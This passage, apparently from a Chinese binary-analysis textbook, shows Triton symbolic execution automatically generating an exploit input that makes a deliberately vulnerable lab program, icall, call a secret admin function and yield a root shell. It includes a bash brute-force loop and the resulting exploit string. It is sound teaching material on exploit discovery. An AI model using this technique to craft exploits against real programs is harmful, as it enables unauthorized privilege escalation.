+首先，我们可以在虚拟机上的Triton主目录中找到triton包装器脚本。回想一下，Triton提供的这个包装器脚本可以自动处理混合执行工具所需的Pin设置。简而言之，包装器脚本将Triton的混合执行库作为Pintool并在Pin中运行被分析的程序icall。该库将用户定义的混合执行工具（exploit_callsite.py）作为参数，并负责启动该工具。
+
+我们需要调用triton包装器脚本来启动分析过程，并传递exploit_callsite.py脚本的名称，以及待分析程序的名称和参数（即icall程序，带有参数索引2和输入字符串AAA）。triton包装器脚本接下来确保程序icall在由exploit_callsite.py脚本控制的Pin中使用给定的参数运行。请注意，输入字符串AAA不是一个漏洞利用，而是一个驱动混合执行的任意字符串。
+
+该脚本拦截icall的main函数，并将argv中的所有用户输入字节符号化。当icall运行到间接调用点时，该调用点将AAA字符串的散列值0x223c625e作为目标地址。这是一个通常会导致程序崩溃的伪地址，但在本例中并不重要，因为在程序执行间接调用之前，exploit_callsite.py会计算出漏洞利用模型。
+
+当程序要执行间接调用点时，exploit_callsite.py试图找到一个模型，该模型能够生成一组散列值为目标地址0x400b3b的用户输入，该地址为秘密管理区域的地址。请注意，此步骤可能会花费一段时间，视硬件配置而定，最多需要几分钟。然而约束求解器无法找到这种模型，所以exploit_callsite.py没有找到一个漏洞利用就停止了。
+
+幸运的是，这并不意味着程序不存在漏洞。回顾一下，你已经以字符串AAA为输入混合运行了icall程序，并且exploit_callsite.py为该字符串中的每个输入字节创建了一个单独的符号变量。约束求解器试图基于长度为3的用户输入字符串找到一个漏洞利用模型，因此，约束求解器没能找到漏洞利用就意味着长度为3的输入字符串不能构成一个合适的漏洞利用，但是我们可以尝试不同长度的输入字符串。可以将这个过程自动化，而不是手动尝试所有可能的输入长度，如下所示。
+
+尝试使用不同输入长度的脚本漏洞利用
+
+```assembly
+$ for i in $(seq 1 100); do
+     str=`python -c "print 'A'*"${i}`
+     echo "Trying input len ${i}"
+./triton ~/code/chapter13/exploit_callsite.py ~/code/chapter13/icall 2 ${str} | grep -a SymVar
+done
+```
+
+这里，我们使用一个bash for语句循环1～100的所有整数i。在每次迭代中，脚本创建一个由i个字母“A”组成的字符串，然后将这个字符串作为用户输入并尝试生成漏洞利用，这类似于之前所示的输入长度为3的情形。
+
+为了减少输出中的混乱，可以使用grep命令只显示包含单词SymVar的输出行。这确保了输出只显示那些输出自成功模型的信息，而不显示没有生成模型的漏洞利用生成信息。
+
+漏洞利用循环的输出从处开始。程序无法找到输入长度为1～3的解模型，但是当输入长度达到4和5时，程序成功找到解模型。之后手动停止脚本运行，因为当已经发现一个漏洞利用时，就没有必要尝试更多的输入长度了。
+
+接下来我们尝试输出报告中的第一个漏洞利用（长度为4的）。为了将输出转换为一个漏洞利用字符串，可以将约束求解器分配给对应于 argv\[2][0]～argv\[2][3]的符号变量的ASCII字符连接起来，因为这些字符用作icall的散列函数输入的用户输入字节。正如输出所示，约束求解器分别为这些字节选择0x24、0x2A、0x58及0x26。argv\[2][4]处的字节应该是用户输入字符串的终止符NULL，但是约束求解器并不知情，为该位置选择了随机输入字节0x40，因此可以放心地忽略它。
+
+模型分配给argv\[2][0]～argv\[2][3]的字节对应ASCII漏洞利用字符串$*X&。我们尝试将这个漏洞利用字符串作为icall的输入，如下所示。
+
+icall程序的漏洞利用
+
+```assembly
+binary@binary-VirtualBox:~/code/chapter13$ ./icall 2 '$*X&'
+Calling 0x400b3b
+# whoami
+root
+# 
+```
+
+要尝试这个漏洞利用的话，需要回到本章的代码目录，即icall程序的所在目录，然后使用越界索引2和刚刚生成的漏洞利用字符串作为参数调用icall程序。可以看到，漏洞利用字符串的散列值恰好为0x400b3b，也就是秘密管理区域的地址。由于程序没有对用户提供的函数指针索引进行边界检查，因此我们可以成功地“欺骗”icall程序调用该地址并提供一个root权限的Shell。如你所见，命令whoami的输出结果为root，证明我们已经获得了root权限的Shell。因此我们已经使用符号执行自动生成了一个漏洞利用！
+
+## 总结
+
+在本章中，学习了如何使用符号执行来构建自动发现二进制程序重要信息的工具。尽管我们在使用符号执行时必须担心最小化可伸缩性的问题，但其仍然是最强大的二进制分析技术之一。正如自动漏洞利用示例所示，可以通过将符号执行工具与其他技术（如动态污点分析）结合使用来进一步提高其效率。
